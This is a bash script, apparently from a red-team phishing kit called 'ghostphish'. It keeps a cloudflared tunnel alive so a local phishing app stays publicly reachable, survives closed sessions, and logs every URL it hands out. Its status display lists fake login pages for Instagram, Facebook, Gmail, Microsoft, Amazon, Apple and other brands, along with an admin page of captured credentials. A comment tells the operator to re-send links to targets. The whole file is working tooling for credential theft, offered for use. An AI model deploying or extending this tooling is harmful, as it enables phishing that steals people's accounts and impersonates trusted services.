#!/usr/bin/env bash
#
# ghostphish persistent tunnel supervisor
# ─────────────────────────────────────────────────────────────
# Keeps a cloudflared quick-tunnel to localhost:8000 alive in the
# background. Auto-restarts if cloudflared dies, waits for the app
# to come back if it goes down, and always writes the CURRENT public
# URL to a file you can read at any time.
#
# Survives your terminal/SSH session closing (setsid-detached).
#
#   ./tunnel-persistent.sh start     # start supervisor in background
#   ./tunnel-persistent.sh stop      # stop supervisor + tunnel
#   ./tunnel-persistent.sh restart   # stop then start (new URL)
#   ./tunnel-persistent.sh status    # show URL, PID, uptime
#   ./tunnel-persistent.sh url       # print just the current URL
#   ./tunnel-persistent.sh logs      # tail the supervisor log
#
# NOTE: trycloudflare quick-tunnels hand out a NEW random URL every
# time cloudflared (re)starts. This supervisor keeps A tunnel alive,
# but the URL changes on each restart. Re-read it with `url`/`status`
# and re-send to targets. For a URL that never changes you need a
# named tunnel + your own domain (see README / ask to set it up).
#
#   Developed by Yaman.RedTeam · github.com/Yaman-RedTeam/ghostphish
#

set -u

# ─── paths (anchored to this script's dir) ────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PORT=8000
LOG_FILE="${SCRIPT_DIR}/ghostphish_tunnel.log"          # supervisor + cloudflared log
URL_FILE="${SCRIPT_DIR}/ghostphish_tunnel.url"          # current public URL (single line)
HIST_FILE="${SCRIPT_DIR}/ghostphish_tunnel.history"     # every URL we've handed out
PID_FILE="${SCRIPT_DIR}/ghostphish_tunnel.pid"          # supervisor PID
CF_PID_FILE="${SCRIPT_DIR}/ghostphish_tunnel.cfpid"     # current cloudflared PID

RESTART_BACKOFF=3      # seconds between tunnel restarts
APP_WAIT=5             # seconds between app health re-checks

# ─── colors ───────────────────────────────────────────────────
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'
B='\033[1;34m'; W='\033[1;37m'; N='\033[0m'

ts() { date '+%Y-%m-%dT%H:%M:%S'; }
slog() { echo "[$(ts)] $*" >> "$LOG_FILE"; }

banner() {
    echo -e "${R}"
    echo -e "   █▀▀ █░█ █▀█ █▀ ▀█▀ █▀█ █░█ █ █▀ █░█ █▀▀ █▀█"
    echo -e "   █▄█ █▀█ █▄█ ▄█ ░█░ █▀▀ █▀█ █ ▄█ █▀█ ██▄ █▀▄"
    echo -e "${N}   ${Y}⚡ persistent tunnel supervisor${N}"
    echo -e "   ${C}Developed by ${R}Yaman.RedTeam${N}\n"
}

app_up() {
    [[ "$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 \
        "http://localhost:${PORT}/health" 2>/dev/null)" == "200" ]]
}

# ─── the supervised loop (runs detached in background) ────────
supervise() {
    echo "$$" > "$PID_FILE"
    slog "═══ supervisor started (pid $$) ═══"
    trap 'slog "supervisor caught TERM/INT, shutting down";
          [[ -f "$CF_PID_FILE" ]] && kill "$(cat "$CF_PID_FILE")" 2>/dev/null;
          rm -f "$CF_PID_FILE" "$PID_FILE" "$URL_FILE"; exit 0' TERM INT

    while true; do
        # Wait until the app is reachable before opening a tunnel to it.
        if ! app_up; then
            slog "app not healthy on :${PORT} — waiting ${APP_WAIT}s"
            sleep "$APP_WAIT"
            continue
        fi

        slog "launching cloudflared quick-tunnel → localhost:${PORT}"
        # Truncate a scratch log so we can parse THIS run's URL cleanly.
        local run_log="${SCRIPT_DIR}/.cf_run.log"
        : > "$run_log"

        cloudflared tunnel --url "http://localhost:${PORT}" >> "$run_log" 2>&1 &
        local cf_pid=$!
        echo "$cf_pid" > "$CF_PID_FILE"
        slog "cloudflared pid=${cf_pid}"

        # Wait (up to 30s) for the public URL to appear.
        local url=""
        for _ in $(seq 1 30); do
            url=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$run_log" | head -1)
            [[ -n "$url" ]] && break
            # If cloudflared already died, bail out of the wait early.
            kill -0 "$cf_pid" 2>/dev/null || break
            sleep 1
        done

        if [[ -n "$url" ]]; then
            echo "$url" > "$URL_FILE"
            echo "[$(ts)] $url" >> "$HIST_FILE"
            slog "✓ TUNNEL LIVE → ${url}"
        else
            slog "✗ no URL surfaced (cloudflared may have failed) — see .cf_run.log"
            rm -f "$URL_FILE"
        fi

        # Fold this run's output into the main log, then block until
        # cloudflared exits (crash, network drop, or Cloudflare cutoff).
        cat "$run_log" >> "$LOG_FILE"
        wait "$cf_pid"
        local rc=$?
        rm -f "$URL_FILE" "$CF_PID_FILE"
        slog "cloudflared exited (rc=${rc}) — restarting in ${RESTART_BACKOFF}s (URL WILL CHANGE)"
        sleep "$RESTART_BACKOFF"
    done
}

# ─── control commands ─────────────────────────────────────────
is_running() {
    [[ -f "$PID_FILE" ]] && kill -0 "$(cat "$PID_FILE" 2>/dev/null)" 2>/dev/null
}

cmd_start() {
    banner
    if is_running; then
        echo -e "${Y}[!] Supervisor already running (pid $(cat "$PID_FILE"))${N}"
        cmd_status
        return 0
    fi
    if ! command -v cloudflared >/dev/null 2>&1; then
        echo -e "${R}[!] cloudflared not installed${N}"
        exit 1
    fi
    if ! app_up; then
        echo -e "${Y}[!] ghostphish not healthy on :${PORT} yet.${N}"
        echo -e "    Supervisor will start anyway and wait for it to come up."
    fi

    : > "$LOG_FILE"
    # Detach: setsid gives a new session so it outlives this shell/SSH.
    setsid bash "${BASH_SOURCE[0]}" __supervise >/dev/null 2>&1 < /dev/null &
    disown 2>/dev/null || true

    echo -e "${G}[✓] Supervisor launching…${N}"
    # Wait briefly for the first URL.
    local url=""
    for _ in $(seq 1 35); do
        url=$(cat "$URL_FILE" 2>/dev/null || true)
        [[ -n "$url" ]] && break
        sleep 1
    done
    echo
    if [[ -n "$url" ]]; then
        cmd_status
    else
        echo -e "${Y}[!] Started, but no URL yet. Check:${N} ./tunnel-persistent.sh logs"
    fi
}

cmd_stop() {
    if ! is_running; then
        echo -e "${Y}[!] Supervisor not running${N}"
        # Best-effort cleanup of any stray cloudflared we own.
        [[ -f "$CF_PID_FILE" ]] && kill "$(cat "$CF_PID_FILE")" 2>/dev/null
        rm -f "$CF_PID_FILE" "$URL_FILE"
        return 0
    fi
    local pid; pid="$(cat "$PID_FILE")"
    echo -e "${R}[!] Stopping supervisor (pid ${pid})…${N}"
    kill -TERM "$pid" 2>/dev/null
    for _ in $(seq 1 10); do is_running || break; sleep 1; done
    is_running && kill -KILL "$pid" 2>/dev/null
    [[ -f "$CF_PID_FILE" ]] && kill "$(cat "$CF_PID_FILE")" 2>/dev/null
    rm -f "$PID_FILE" "$CF_PID_FILE" "$URL_FILE"
    echo -e "${G}[✓] Stopped${N}"
}

cmd_status() {
    if is_running; then
        local pid; pid="$(cat "$PID_FILE")"
        local url; url="$(cat "$URL_FILE" 2>/dev/null || echo '(connecting…)')"
        echo -e "${W}════════════════════════════════════════════════════════${N}"
        echo -e "${G}   ● SUPERVISOR RUNNING${N}   (pid ${pid})"
        echo -e "${W}════════════════════════════════════════════════════════${N}"
        echo -e "${C}   Public URL:${N} ${B}${url}${N}\n"
        if [[ "$url" == https* ]]; then
            echo -e "${Y}   ── Phishing pages ──────────────────────────────${N}"
            for t in instagram facebook netflix twitter linkedin snapchat microsoft gmail amazon apple; do
                printf "   %-11s ${W}%s${N}\n" "$t" "${url}/${t}"
            done
            echo
            echo -e "${Y}   ── Admin ───────────────────────────────────────${N}"
            printf "   %-11s ${W}%s${N}\n" "captures" "${url}/admin/captures"
        fi
        echo -e "${W}════════════════════════════════════════════════════════${N}"
    else
        echo -e "${R}   ○ supervisor NOT running${N}   —   ./tunnel-persistent.sh start"
    fi
}

cmd_url()  { cat "$URL_FILE" 2>/dev/null || { echo "no active tunnel" >&2; exit 1; }; }
cmd_logs() { tail -f "$LOG_FILE"; }

# ─── dispatch ─────────────────────────────────────────────────
case "${1:-start}" in
    __supervise) supervise ;;                       # internal: the detached loop
    start)       cmd_start ;;
    stop)        cmd_stop ;;
    restart)     cmd_stop; sleep 1; cmd_start ;;
    status)      banner; cmd_status ;;
    url)         cmd_url ;;
    logs)        cmd_logs ;;
    *) echo "usage: $0 {start|stop|restart|status|url|logs}"; exit 1 ;;
esac
